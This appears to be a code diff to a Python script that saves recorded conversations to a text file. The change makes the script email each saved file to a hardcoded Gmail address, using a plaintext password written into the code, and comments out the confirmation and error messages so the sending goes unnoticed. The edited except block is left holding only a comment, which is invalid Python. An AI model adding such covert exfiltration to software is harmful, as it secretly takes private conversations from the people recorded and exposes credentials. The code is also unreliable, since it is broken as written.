@@ -66,9 +66,8 @@ def save_conversation():
     with open(filename, 'w') as txt:
         txt.write(conversation)
 
-    send_email(filename)
-    print(f"Conversation saved.")
-send_email("filename.txt", "mt580183@gmail.com", "P1fQRZOXNpT96CYE", "mt580183@gmail.com")
+    send_email(filename, "mt580183@gmail.com", "P1fQRZOXNpT96CYE", "mt580183@gmail.com")
+    #print(f"Conversation saved.")
 
 def send_email(filename, sender_email, sender_password, receiver_email):
     message = MIMEMultipart()
@@ -91,7 +90,7 @@ def send_email(filename, sender_email, sender_password, receiver_email):
         
         print("Success.")
     except smtplib.SMTPException as e:
-        print(f"Error occurred: {str(e)}")
+        #print(f"Error occurred: {str(e)}")
 
 is_listening = False
 
